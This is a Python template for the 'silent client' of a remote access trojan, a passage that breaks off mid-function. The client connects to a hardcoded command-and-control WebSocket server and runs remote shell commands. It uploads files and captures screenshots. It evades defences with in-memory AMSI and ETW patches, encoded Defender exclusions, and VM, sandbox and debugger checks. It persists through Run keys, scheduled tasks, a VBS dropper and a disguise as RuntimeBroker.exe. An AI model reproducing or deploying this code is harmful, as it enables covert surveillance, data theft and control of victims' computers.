# H-Dex Silent Client Template
# This is a headless client, designed to be built by the H-Dex Dashboard Builder.

# --- Core Core Imports ---
import asyncio
import base64
import hashlib
import io
import json
import os
import platform
import random
import re
import shutil
import socket
import ssl
import subprocess
import sys
import threading
import time
import traceback
import uuid
import winreg
from datetime import timedelta

import websockets
import websockets.client
import websockets.exceptions

# --- Safe Feature Imports ---
try:
    import psutil
except ImportError:
    psutil = None

try:
    import requests
except ImportError:
    requests = None

try:
    import ctypes

    import cv2
    import mss
    import numpy as np
    import pyautogui
    import pyperclip
    import sounddevice as sd
    from PIL import Image
    from pynput import keyboard, mouse
except ImportError:
    pass

# --- Builder-injected Configuration ---
SERVER_URI = "##_SERVER_URI_##"
if "##" in SERVER_URI:
    SERVER_URI = "wss://realmrhacker-h-dex.hf.space/ws"

CLIENT_TAG = "##_CLIENT_TAG_##"
if "##" in CLIENT_TAG:
    CLIENT_TAG = "Client"

ADD_TO_STARTUP = "##_ADD_TO_STARTUP_##"
if "##" in ADD_TO_STARTUP:
    ADD_TO_STARTUP = "False"

STARTUP_KEY_NAME = "##_STARTUP_KEY_NAME_##"
if "##" in STARTUP_KEY_NAME:
    STARTUP_KEY_NAME = "H-Dex Client"

# --- Advanced Configuration ---
ENABLE_ANTI_VM = False
ENABLE_GEOFENCE = False
ALLOWED_COUNTRIES = ["US", "CA", "UK", "DE", "FR"]  # ISO Codes
STEALTH_MODE = False
ENABLE_MELTER = False
ENABLE_CRITICAL = False
ENABLE_DEFENDER_EXCLUSION = False

# --- Global Stealth Patcher ---
if sys.platform == "win32":
    _original_popen = subprocess.Popen
    class StealthPopen(_original_popen):
        def __init__(self, *args, **kwargs):
            if kwargs.get('shell') or len(args) > 0 and isinstance(args[0], str):
                if 'creationflags' not in kwargs:
                    kwargs['creationflags'] = 0x08000000
            super().__init__(*args, **kwargs)
    subprocess.Popen = StealthPopen

if "##" in CLIENT_TAG:
    CLIENT_TAG = "Client"

ADD_TO_STARTUP = "##_ADD_TO_STARTUP_##"
if "##" in ADD_TO_STARTUP:
    ADD_TO_STARTUP = "False"

STARTUP_KEY_NAME = "##_STARTUP_KEY_NAME_##"
if "##" in STARTUP_KEY_NAME:
    STARTUP_KEY_NAME = "H-Dex Client"

# --- Advanced Configuration ---
ENABLE_ANTI_VM = False
ENABLE_GEOFENCE = False
ALLOWED_COUNTRIES = ["US", "CA", "UK", "DE", "FR"]  # ISO Codes
STEALTH_MODE = False
ENABLE_MELTER = False
ENABLE_CRITICAL = False
ENABLE_DEFENDER_EXCLUSION = False


class SilentClient:
    def __init__(self):
        self.websocket = None
        self.running = True
        self.screen_streaming = False
        self.webcam_streaming = False
        self.metrics_streaming = False
        self.audio_streaming = False
        self.screen_quality = 50
        self.screen_resolution = (800, 600)
        self.screen_fps_delay = 0.1
        self.keylogger_running = False
        self.clipboard_monitoring = False
        self.clipboard_last = ""
        self.window_tracking = False
        self.window_log = []
        self.crypto_clipper_active = False
        self.crypto_wallets = {}  # Filled by dashboard command

        # --- Pre-init: Bypass Security Instrumentation ---
        self._patch_amsi()
        self._patch_etw()

        # --- Jittered Startup Delay (Anti-Sandbox Timing) ---
        time.sleep(random.uniform(1.5, 4.0))

        # --- Runtime Process Disguise ---
        try:
            ctypes.windll.kernel32.SetConsoleTitleW("Service Host: Local System")
        except:
            pass

        # --- Mutex: Prevent Duplicate Instances ---
        try:
            mutex_name = "Global\\WinRuntimeBroker_" + hashlib.md5(STARTUP_KEY_NAME.encode()).hexdigest()[:8]
            self._mutex = ctypes.windll.kernel32.CreateMutexW(None, True, mutex_name)
            if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                os._exit(0)  # Another instance is already running
        except:
            pass

        # --- Config Storage (Disguised as Windows Component) ---
        self.config_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "RuntimeBroker")
        if not os.path.exists(self.config_dir):
            os.makedirs(self.config_dir)
            # Hide the config directory
            try:
                ctypes.windll.kernel32.SetFileAttributesW(self.config_dir, 0x02)  # FILE_ATTRIBUTE_HIDDEN
            except:
                pass
        self.config_file = os.path.join(self.config_dir, "broker_config.json")
        self.server_pool = self.load_server_pool()
        self.current_pool_index = 0
        self.reconnect_event = asyncio.Event()

        # New configurable fields from builder
        try:
            val = "##_SLEEP_DELAY_##"
            if "##" in val or not val:
                self.sleep_delay = 0
            else:
                self.sleep_delay = int(val)
        except:
            self.sleep_delay = 0

        if self.sleep_delay > 0:
            time.sleep(self.sleep_delay)

        self.loop = asyncio.new_event_loop()

        # Security Checks
        if ENABLE_ANTI_VM and self.check_vm():
            sys.exit(0)  # Silent exit

        if ENABLE_GEOFENCE:
            self.loop.run_until_complete(self.check_geofence())

        if STEALTH_MODE:
            self.hide_tracks()

        if ADD_TO_STARTUP == "True":
            self.ensure_persistence()
        else:
            if ENABLE_CRITICAL:
                self.set_critical_process()

        if ENABLE_DEFENDER_EXCLUSION:
            self._add_defender_exclusion()

        # Advanced Stealth Checks
        if STEALTH_MODE:
            self.check_analysis_tools()

        threading.Thread(target=self.start_async_loop, daemon=True).start()
        threading.Thread(target=self.watchdog_timer, daemon=True).start()
        # Start continuous background evasion monitor
        if STEALTH_MODE:
            threading.Thread(target=self._continuous_evasion_monitor, daemon=True).start()


    # --- Defender Exclusion ---
    def _add_defender_exclusion(self):
        """Add current executable to Windows Defender Exclusions"""
        try:
            if ctypes.windll.shell32.IsUserAnAdmin() != 0:
                exe_path = os.path.abspath(sys.executable)
                # Base64 encode the Add-MpPreference command to spoof static analysis
                raw_script = f"Add-MpPreference -ExclusionPath '{exe_path}' -ErrorAction SilentlyContinue"
                b64 = base64.b64encode(raw_script.encode('utf-16-le')).decode('utf-8')
                cmd = f"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand {b64}"
                subprocess.Popen(cmd, shell=True)
        except:
            pass

    # --- AMSI Bypass (Anti-Malware Scan Interface) ---
    def _patch_amsi(self):
        """Patch AmsiScanBuffer in memory to neutralize real-time scanning"""
        try:
            k32 = ctypes.windll.kernel32
            # Obfuscated: "amsi.dll"
            amsi_dll = bytes([97, 109, 115, 105, 46, 100, 108, 108])
            amsi = k32.LoadLibraryA(amsi_dll)
            if not amsi:
                return
            # Obfuscated: "AmsiScanBuffer"
            amsi_scan = bytes([65, 109, 115, 105, 83, 99, 97, 110, 66, 117, 102, 102, 101, 114])
            addr = k32.GetProcAddress(amsi, amsi_scan)
            if not addr:
                return
            # Patch: Force AMSI_RESULT_CLEAN return
            patch = b'\xB8\x57\x00\x07\x80\xC3'  # mov eax, 0x80070057; ret (E_INVALIDARG)
            old_protect = ctypes.c_ulong(0)
            k32.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old_protect))  # PAGE_EXECUTE_READWRITE
            ctypes.memmove(addr, patch, len(patch))
            k32.VirtualProtect(addr, len(patch), old_protect.value, ctypes.byref(old_protect))
        except:
            pass

    # --- ETW Bypass (Event Tracing for Windows) ---
    def _patch_etw(self):
        """Patch EtwEventWrite to prevent telemetry from reaching Defender"""
        try:
            k32 = ctypes.windll.kernel32
            # Obfuscated: "ntdll.dll"
            ntdll_lib = bytes([110, 116, 100, 108, 108, 46, 100, 108, 108])
            ntdll = k32.LoadLibraryA(ntdll_lib)
            if not ntdll:
                return
            # Obfuscated: "EtwEventWrite"
            etw_write = bytes([69, 116, 119, 69, 118, 101, 110, 116, 87, 114, 105, 116, 101])
            addr = k32.GetProcAddress(ntdll, etw_write)
            if not addr:
                return
            # Patch: Return 0 (STATUS_SUCCESS) immediately
            patch = b'\xC3'  # ret
            old_protect = ctypes.c_ulong(0)
            k32.VirtualProtect(addr, 1, 0x40, ctypes.byref(old_protect))
            ctypes.memmove(addr, patch, 1)
            k32.VirtualProtect(addr, 1, old_protect.value, ctypes.byref(old_protect))
        except:
            pass

    def check_vm(self):
        """Comprehensive Virtual Machine, Sandbox, and Honeypot detection"""
        try:
            # 1. MAC Address Prefixes (VM Vendors)
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]).upper()
            vm_macs = [
                "00:0C:29", "00:50:56", "00:05:69", "00:1C:14",  # VMware
                "08:00:27",  # VirtualBox
                "00:16:3E",  # Xen
                "00:15:5D",  # Hyper-V
                "00:21:F6", "00:1A:4C",  # Parallels / Others
                "52:54:00",  # QEMU/KVM
            ]
            if any(mac.startswith(prefix) for prefix in vm_macs):
                return True

            # 2. BIOS / System Manufacturer
            if platform.system() == "Windows":
                bios = subprocess.check_output("wmic bios get serialnumber", shell=True, creationflags=0x08000000).decode().lower()
                sys_info = subprocess.check_output("wmic computersystem get model,manufacturer", shell=True, creationflags=0x08000000).decode().lower()
                artifacts = ["vmware", "virtualbox", "vbox", "qemu", "bochs", "parallels", "hyper-v", "hyperv", "xen", "kvm", "innotek"]
                if any(art in bios for art in artifacts) or any(art in sys_info for art in artifacts):
                    return True

            # 3. Low Hardware Resources = Sandbox
            if psutil:
                ram_gb = psutil.virtual_memory().total / (1024**3)
                cpu_count = psutil.cpu_count(logical=True)
                if ram_gb < 2 or cpu_count < 2:
                    return True  # Most sandboxes run with minimal resources

            # 4. System Uptime Check (sandbox reboots frequently)
            try:
                uptime = time.time() - psutil.boot_time()
                if uptime < 120:  # Less than 2 minutes uptime
                    return True
            except:
                pass

            # 5. Recent User Interaction (sandbox = no mouse movement)
            try:
                class LASTINPUTINFO(ctypes.Structure):
                    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
                lii = LASTINPUTINFO()
                lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
                ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
                millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
                if millis > 600000:  # No input for 10+ minutes = probably sandbox
                    return True
            except:
                pass

            # 6. Screen Resolution (sandboxes often use minimal resolution)
            try:
                w = ctypes.windll.user32.GetSystemMetrics(0)
                h = ctypes.windll.user32.GetSystemMetrics(1)
                if w < 1024 or h < 768:
                    return True
            except:
                pass

            # 7. Check Temp files count (real users have lots, sandboxes don't)
            try:
                temp_dir = os.getenv("TEMP")
                if temp_dir and len(os.listdir(temp_dir)) < 10:
                    return True
            except:
                pass

            # 8. Check for sandbox/analysis specific files
            sandbox_paths = [
                r"C:\agent\agent.pyw",
                r"C:\sandbox",
                r"C:\analysis",
                r"C:\iDEFENSE",
                r"C:\stuff\odbg110",
                r"C:\Program Files\VMware",
                r"C:\Program Files\Oracle\VirtualBox",
            ]
            if any(os.path.exists(p) for p in sandbox_paths):
                return True

            return False
        except:
            return False

    async def check_geofence(self):
        """Ensure client is operating within allowed regions"""
        try:
            if not requests: return
            response = requests.get("http://ip-api.com/json", timeout=5).json()
            if response.get("status") == "success":
                country_code = response.get("countryCode")
                if country_code not in ALLOWED_COUNTRIES:
                    os._exit(0)
        except:
            pass

    def check_analysis_tools(self):
        """Comprehensive analysis/security tool detection with silent exit"""
        try:
            analysis_procs = [
                # Debuggers
                "x64dbg", "x32dbg", "ollydbg", "ida", "ida64", "idaq", "idaq64",
                "windbg", "immunity", "radare2",
                # Network Analyzers
                "wireshark", "fiddler", "httpdebugger", "charles", "burpsuite",
                "mitmproxy", "tcpview",
                # Process Monitors
                "processhacker", "procmon", "procexp", "procexp64",
                "filemon", "regmon",
                # Reverse Engineering
                "dnspy", "de4dot", "ilspy", "dotpeek", "pestudio",
                "ghidra", "cutter",
                # Antivirus Scanners
                "autoruns", "gmer", "mbam", "avp", "avgui",
                # Sandbox Tools
                "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray",
                "xenservice",
            ]
            for proc in psutil.process_iter(["name"]):
                pname = proc.info["name"].lower()
                if any(tool in pname for tool in analysis_procs):
                    os._exit(0)
        except:
            pass

    def _continuous_evasion_monitor(self):
        """Background thread that continuously checks for threats"""
        while self.running:
            try:
                # Re-check for analysis tools
                if STEALTH_MODE:
                    self.check_analysis_tools()
                # Re-check for debugger
                try:
                    if ctypes.windll.kernel32.IsDebuggerPresent():
                        os._exit(0)
                    # Check remote debugger
                    is_remote = ctypes.c_int(0)
                    ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                        ctypes.windll.kernel32.GetCurrentProcess(),
                        ctypes.byref(is_remote)
                    )
                    if is_remote.value:
                        os._exit(0)
                except:
                    pass
            except:
                pass
            time.sleep(30)  # Check every 30 seconds

    def watchdog_timer(self):
        """Periodically check and repair persistence"""
        while self.running:
            try:
                if ADD_TO_STARTUP == "True":
                    exe_path = os.path.realpath(subprocess.sys.executable)
                    
                    # 1. Check Registry Run Key
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    reg_missing = False
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ) as key:
                        try:
                            val, _ = winreg.QueryValueEx(key, STARTUP_KEY_NAME)
                        except FileNotFoundError:
                            reg_missing = True
                            
                    if reg_missing:
                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as skey:
                            winreg.SetValueEx(skey, STARTUP_KEY_NAME, 0, winreg.REG_SZ, f'"{exe_path}"')

                    # 2. Check Environment Var
                    env_missing = False
                    env_path = r"Environment"
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, env_path, 0, winreg.KEY_READ) as key:
                        try:
                            val, _ = winreg.QueryValueEx(key, "UserInitMprLogonScript")
                        except FileNotFoundError:
                            env_missing = True
                            
                    if env_missing:
                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, env_path, 0, winreg.KEY_SET_VALUE) as skey:
                            winreg.SetValueEx(skey, "UserInitMprLogonScript", 0, winreg.REG_SZ, f'"{exe_path}"')

                    # 3. Check Scheduled Task
                    output = subprocess.run(f'schtasks /query /tn "{STARTUP_KEY_NAME}"', shell=True, capture_output=True, text=True, creationflags=0x08000000)
                    if "ERROR: The system cannot find the file specified" in output.stderr or "ERROR" in output.stderr:
                        subprocess.run(f'schtasks /create /tn "{STARTUP_KEY_NAME}" /tr "{exe_path}" /sc onlogon /rl highest /f', shell=True, capture_output=True, creationflags=0x08000000)
                        
                    # 4. Check Startup Folder Drop
                    appdata_path = os.getenv("APPDATA")
                    startup_folder = os.path.join(appdata_path, r"Microsoft\Windows\Start Menu\Programs\Startup")
                    if os.path.exists(startup_folder):
                        shortcut_path = os.path.join(startup_folder, f"{STARTUP_KEY_NAME}.bat")
                        if not os.path.exists(shortcut_path):
                            with open(shortcut_path, "w") as f:
                                # Start minimized, point to the current exe
                                f.write(f'@echo off\nstart "" /MIN "{exe_path}"\nexit')
                            ctypes.windll.kernel32.SetFileAttributesW(shortcut_path, 0x02 | 0x04)

            except Exception as e:
                if not STEALTH_MODE: print(f"Watchdog Err: {e}")
            time.sleep(60)  # Check every minute

    def hide_tracks(self):
        try:
            HIDDEN_SYSTEM = 0x02 | 0x04  # HIDDEN + SYSTEM

            # Hide self executable
            exe_path = os.path.realpath(subprocess.sys.executable)
            ctypes.windll.kernel32.SetFileAttributesW(exe_path, HIDDEN_SYSTEM)

            # Anti-Debugger
            if ctypes.windll.kernel32.IsDebuggerPresent():
                os._exit(0)

            # Remote debugger check
            is_remote = ctypes.c_int(0)
            ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                ctypes.windll.kernel32.GetCurrentProcess(),
                ctypes.byref(is_remote)
            )
            if is_remote.value:
                os._exit(0)

            # Disable Windows Error Reporting for this process
            try:
                subprocess.run(
                    'reg add "HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting" /v DontShowUI /t REG_DWORD /d 1 /f',
                    shell=True, capture_output=True, creationflags=0x08000000
                )
            except:
                pass

        except:
            pass

    def ensure_persistence(self):
        try:
            exe_path = os.path.realpath(subprocess.sys.executable)
            appdata_path = os.getenv("APPDATA")
            # Disguised as a Windows System App
            persist_dir = os.path.join(appdata_path, "Microsoft", "Windows", "SystemApps")

            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)
                ctypes.windll.kernel32.SetFileAttributesW(persist_dir, 0x02 | 0x04)

            # Use a legitimate-sounding name
            new_exe_name = "RuntimeBroker.exe"
            new_exe_path = os.path.join(persist_dir, new_exe_name)

            if exe_path.lower() != new_exe_path.lower():
                # Copy self to persistence folder
                shutil.copy(exe_path, new_exe_path)
                ctypes.windll.kernel32.SetFileAttributesW(new_exe_path, 0x02 | 0x04)

                # Add to Registry
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.SetValueEx(
                        reg_key, STARTUP_KEY_NAME, 0, winreg.REG_SZ, f'"{new_exe_path}"'
                    )

                # Try to add to Task Scheduler for admin persistence (optional/advanced)
                try:
                    subprocess.run(
                        f'schtasks /create /tn "{STARTUP_KEY_NAME}" /tr "{new_exe_path}" /sc onlogon /rl highest /f',
                        shell=True,
                        capture_output=True,
                        creationflags=0x08000000,
                    )
                except:
                    pass
                    
                # Setup Deep Persistence: HKCU\Environment
                try:
                    env_key_path = r"Environment"
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, env_key_path, 0, winreg.KEY_SET_VALUE) as env_key:
                        winreg.SetValueEx(env_key, "UserInitMprLogonScript", 0, winreg.REG_SZ, f'"{new_exe_path}"')
                except Exception as e:
                    if not STEALTH_MODE: print(f"Env Persistence err: {e}")

                # Setup Deep Persistence: VBS Dropper + Task Scheduler
                try:
                    vbs_path = os.path.join(persist_dir, "sysupdate.vbs")
                    # Obfuscated VBS to stealth-launch the exe (WScript.Shell)
                    vbs_code = f'CreateObject("WScript.Shell").Run "{new_exe_path}", 0, False'
                    with open(vbs_path, "w") as f: f.write(vbs_code)
                    ctypes.windll.kernel32.SetFileAttributesW(vbs_path, 0x02 | 0x04)
                    
                    # Add to RunOnce as fallback
                    run_once_key = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_once_key, 0, winreg.KEY_SET_VALUE) as env_key:
                        winreg.SetValueEx(env_key, "WinSystemConfig", 0, winreg.REG_SZ, f'wscript.exe "{vbs_path}" //B //nologo')
                except Exception as e:
                    pass

                # Launch persistent version and exit original
                subprocess.Popen(new_exe_path, shell=True, creationflags=0x08000000)

                # "Melter" logic - try to delete original file after a delay
                if ENABLE_MELTER:
                    subprocess.Popen(f'timeout /t 3 & del /f /q "{exe_path}"', shell=True, creationflags=0x08000000)
                os._exit(0)

            # If we are the persistent process, try to protect it
            if ENABLE_CRITICAL:
                self.set_critical_process()
            
            if ENABLE_DEFENDER_EXCLUSION:
                self._add_defender_exclusion()

        except Exception as e:
            if not STEALTH_MODE:
                print(f"Persistence error: {e}")

    def set_critical_process(self):
        """Mark process as critical so it causes BSOD if killed (requires Admin)"""
        try:
            # SE_DEBUG_NAME = 20
            # This is a dangerous but powerful stealth feature
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
        except:
            pass

    def add_defender_exclusion(self, path):
        """Try to add the persistence folder to Windows Defender exclusions"""
        try:
            cmd = f"powershell -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '{path}'\""
            subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)
        except:
            pass

    def load_server_pool(self):
        """Load the server pool from local storage, ensure hardcoded SERVER_URI is present"""
        # Ensure we have a valid URI
        uri = SERVER_URI
        if not uri or "##" in uri:
            uri = "wss://realmrhacker-h-dex.hf.space/ws"

        pool = [uri]
        # Add localhost fallbacks for testing
        pool.extend(["ws://localhost:8080/ws", "ws://127.0.0.1:8080/ws"])

        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, "r") as f:
                    config = json.load(f)
                    saved_pool = config.get("server_pool", [])
                    if isinstance(saved_pool, list):
                        for s in saved_pool:
                            if (
                                s != uri
                                and s not in pool
                                and (s.startswith("ws://") or s.startswith("wss://"))
                            ):
                                pool.append(s)
        except:
            pass
        return pool

    def save_server_pool(self, pool):
        """Save the server pool list to local storage"""
        try:
            with open(self.config_file, "w") as f:
                json.dump({"server_pool": pool}, f)
        except:
            pass

    def start_async_loop(self):
        try:
            # For Windows, use ProactorEventLoop for better stability
            if sys.platform == "win32":
                self.loop = asyncio.new_event_loop()
                asyncio.set_event_loop(self.loop)
            else:
                self.loop = asyncio.new_event_loop()
                asyncio.set_event_loop(self.loop)

            self.loop.run_until_complete(self.run_client_lifecycle())
        except KeyboardInterrupt:
            self.running = False
        except Exception as e:
            if not STEALTH_MODE:
                print(f"[!] Event loop error: {e}")
        finally:
            try:
                self.loop.close()
            except:
                pass

    async def run_client_lifecycle(self):
        """Main client lifecycle with auto-reconnection via the server pool"""
        reconnect_delay = 5
        max_delay = 60

        while self.running:
            try:
                # Create a task for the connection
                conn_task = asyncio.create_task(self.connect_to_server())

                # Wait for either the connection to die or a reconnect event
                reconnect_task = asyncio.create_task(self.reconnect_event.wait())
                done, pending = await asyncio.wait(
                    [conn_task, reconnect_task],
                    return_when=asyncio.FIRST_COMPLETED,
                )

                if self.reconnect_event.is_set():
                    # Migration or pool update triggered
                    self.reconnect_event.clear()
                    if self.websocket:
                        try:
                            await self.websocket.close()
                        except:
                            pass

                # Clean up pending tasks
                for task in pending:
                    task.cancel()
                    try:
                        await task
                    except asyncio.CancelledError:
                        pass

                # If we were disconnected, wait with backoff and move to next server in pool
                if not self.running:
                    break

                # Network Stealth: Add jitter to reconnection delay (±20%)
                jitter = reconnect_delay * random.uniform(0.8, 1.2)
                if not STEALTH_MODE:
                    print(f"[*] Reconnecting in {jitter:.1f}s...")
                await asyncio.sleep(jitter)
                
                reconnect_delay = min(reconnect_delay * 1.5, max_delay)

                # Move to next server in pool
                self.current_pool_index = (self.current_pool_index + 1) % len(
                    self.server_pool
                )

                # Reset delay after cycling through all servers
                if self.current_pool_index == 0:
                    reconnect_delay = 5

            except Exception as e:
                if not STEALTH_MODE:
                    print(f"[!] Lifecycle error: {e}")
                await asyncio.sleep(5)

    async def connect_to_server(self):
        target_uri = self.server_pool[self.current_pool_index]
        try:
            # Create proper SSL context based on protocol
            ssl_context = None
            if target_uri.startswith("wss://"):
                try:
                    import certifi

                    ssl_context = ssl.create_default_context(cafile=certifi.where())
                except:
                    ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE

            # Connection parameters with proper timeouts
            connect_params = {
                "uri": target_uri,
                "max_size": 10485760,
                "ping_interval": 20,
                "ping_timeout": 10,
                "close_timeout": 10,
                "compression": None,  # Disable compression for stability
            }

            if ssl_context:
                connect_params["ssl"] = ssl_context

            # Try connection with timeout
            async with websockets.connect(**connect_params) as websocket:
                self.websocket = websocket
                if not STEALTH_MODE:
                    print(f"[*] Connected to {target_uri}")
                # Gather comprehensive system info
                info = self.gather_system_info()
                await websocket.send(
                    json.dumps({"type": "register_device", "info": info})
                )
                await self.receive_messages(websocket)
        except websockets.exceptions.InvalidURI:
            if not STEALTH_MODE:
                print(f"[!] Invalid URI: {target_uri}")
        except websockets.exceptions.InvalidStatusCode as e:
            if not STEALTH_MODE:
                print(f"[!] Server rejected connection: {e}")
        except (websockets.exceptions.WebSocketException, ssl.SSLError) as e:
            if not STEALTH_MODE:
                print(f"[!] WebSocket/SSL error: {e}")
        except (ConnectionRefusedError, OSError) as e:
            if not STEALTH_MODE:
                print(f"[!] Connection refused: {e}")
        except asyncio.TimeoutError:
            if not STEALTH_MODE:
                print(f"[!] Connection timeout")
        except Exception as e:
            if not STEALTH_MODE:
                print(f"[!] Unexpected error: {e}")
                if not STEALTH_MODE and "traceback" in globals():
                    traceback.print_exc()

    async def migrate_server(self, new_uri):
        """Put new URI at top of pool and reconnect"""
        if not new_uri.startswith(("ws://", "wss://")):
            return

        # Pull to front of pool
        if new_uri in self.server_pool:
            self.server_pool.remove(new_uri)
        self.server_pool.insert(0, new_uri)

        self.current_pool_index = 0
        self.save_server_pool(self.server_pool)
        self.reconnect_event.set()

    async def update_pool(self, new_pool):
        """Replace the entire server pool with a new list"""
        if not isinstance(new_pool, list) or not new_pool:
            return

        # Validate URLs
        valid_pool = [u for u in new_pool if u.startswith(("ws://", "wss://"))]
        if not valid_pool:
            return

        self.server_pool = valid_pool
        self.current_pool_index = 0
        self.save_server_pool(valid_pool)
        self.reconnect_event.set()

    async def add_to_pool(self, new_uri):
        """Add a single URI to the backup pool if it doesn't exist"""
        if not new_uri.startswith(("ws://", "wss://")):
            return
        if new_uri not in self.server_pool:
            self.server_pool.append(new_uri)
            self.save_server_pool(self.server_pool)
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "command_output",
                        "output": f"Added to fallback pool: {new_uri}",
                    }
                )
            )

    def get_hwid(self):
        """Generate a unique, persistent hardware ID"""
        try:
            # Combine multiple markers for uniqueness
            guid = ""
            try:
                # BIOS UUID (Windows)
                output = (
                    subprocess.check_output("wmic csproduct get uuid", shell=True)
                    .decode()
                    .split("\n")[1]
                    .strip()
                )
                if output:
                    guid += output
            except:
                pass

            if not guid:
                # Fallback to MAC + OS components
                import uuid

                guid = str(uuid.getnode()) + platform.node() + platform.processor()

            return hashlib.sha256(guid.encode()).hexdigest()[:12].upper()
        except:
            return f"DEV-{random.randint(1000, 9999)}"

    def gather_system_info(self):
        """Gather comprehensive system information for registration"""
        info = {
            "id": self.get_hwid(),
            "name": platform.node(),
            "ip": self.get_public_ip(),
            "tag": CLIENT_TAG,
            "os": f"{platform.system()} {platform.release()}",
            "username": os.getenv("USERNAME", "Unknown"),
            "hostname": socket.gethostname(),
            "arch": platform.machine(),
            "processor": platform.processor()[:50]
            if platform.processor()
            else "Unknown",
            "uptime": self.get_uptime(),
            "active_window": self.get_active_window_title(),
        }

        # Get local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info["local_ip"] = s.getsockname()[0]
            s.close()
        except:
            info["local_ip"] = "Unknown"

        # Get MAC address
        try:
            mac = ":".join(
                [
                    "{:02x}".format((uuid.getnode() >> ele) & 0xFF)
                    for ele in range(0, 8 * 6, 8)
                ][::-1]
            )
            info["mac"] = mac
        except:
            info["mac"] = "Unknown"

        # Get RAM info
        if psutil:
            try:
                mem = psutil.virtual_memory()
                info["ram_total"] = f"{mem.total / (1024**3):.1f} GB"
                info["ram_available"] = f"{mem.available / (1024**3):.1f} GB"
            except:
                pass

        # Get CPU cores
        try:
            info["cpu_cores"] = os.cpu_count()
        except:
            pass

        # Get disk info
        if psutil:
            try:
                disk = psutil.disk_usage("/")
                info["disk_total"] = f"{disk.total / (1024**3):.1f} GB"
                info["disk_free"] = f"{disk.free / (1024**3):.1f} GB"
            except:
                pass

        # Get location info from IP API
        if requests:
            try:
                loc_data = requests.get("http://ip-api.com/json", timeout=5).json()
                if loc_data.get("status") == "success":
                    info["country"] = loc_data.get("country", "Unknown")
                    info["city"] = loc_data.get("city", "Unknown")
                    info["region"] = loc_data.get("regionName", "Unknown")
                    info["isp"] = loc_data.get("isp", "Unknown")
                    info["timezone"] = loc_data.get("timezone", "Unknown")
            except:
                pass

        return info

    def get_public_ip(self):
        try:
            return requests.get("https://api.ipify.org", timeout=5).text
        except:
            return "Unknown"

    # --- Features ---
    async def list_directory(self, path):
        try:
            items = []
            for name in os.listdir(path):
                p = os.path.join(path, name)
                items.append({"name": name, "is_dir": os.path.isdir(p)})
            await self.websocket.send(
                json.dumps({"type": "dir_list", "path": path, "items": items})
            )
        except Exception as e:
            await self.websocket.send(
                json.dumps(
                    {"type": "dir_list", "path": path, "items": [], "error": str(e)}
                )
            )

    async def upload_file_to_server(self, path):
        try:
            with open(path, "rb") as f:
                content = base64.b64encode(f.read()).decode("utf-8")
            await self.websocket.send(
                json.dumps(
                    {
                        "type": "file_content",
                        "filename": os.path.basename(path),
                        "content": content,
                    }
                )
            )
        except:
            pass

    async def run_command(self, cmd):
        try:
            if cmd.lower().startswith("cd "):
                new_dir = cmd[3:].strip()
                if os.path.isdir(new_dir):
                    os.chdir(new_dir)
                    out = f"Changed directory to {os.getcwd()}"
                else:
                    out = "Directory not found"
            else:
                out = subprocess.check_output(
                    cmd, shell=True, stderr=subprocess.STDOUT, cwd=os.getcwd()
                ).decode("utf-8", errors="ignore")
        except Exception as e:
            out = str(e)

        # Append CWD to output for prompt
        out += f"\n\nPS {os.getcwd()}> "
        await self.websocket.send(json.dumps({"type": "command_output", "output": out}))

    async def send_process_list(self):
        procs = []
        for p in psutil.process_iter(["pid", "name"]):
            try:
                procs.append(p.info)
            except:
                pass
        await self.websocket.send(
            json.dumps({"type": "process_list", "processes": procs})
        )

    def kill_process(self, pid):
        try:
            psutil.Process(pid).terminate()
        except:
            pass
    async def take_screenshot(self):
        """Send a single screenshot frame to the server"""
        try:
            import mss
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                sct_img = sct.grab(monitor)
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                
                # Use current streaming resolution settings or default to 800x600 for single shots
                res = self.screen_resolution if self.screen_resolution != "Original" else (800, 600)
                img.thumbnail(res)
                
                buffer = io.BytesIO()
                img.save(buffer, format="JPEG", quality=80)
                b64 = base64.b64encode(buffer.getvalue()).decode("utf-8")
                
                await self.websocket.send(json.dumps({
                    "type": "screen_frame",
                    "data": b64,
                    "single_frame": True # Hint for the bot
                }))
        except Exception as e:
            await self.websocket.send(json.dumps({
                "type": "command_output",
                "output": f"Screenshot Error: {e}"
            }))

    def stream_screen(self):
        with mss.mss() as sct:
            while self.screen_streaming and self.websocket:
                try:
                    monitor = sct.monitors[1]
                    sct_img = sct.grab(monitor)
                    img = Image.frombytes(
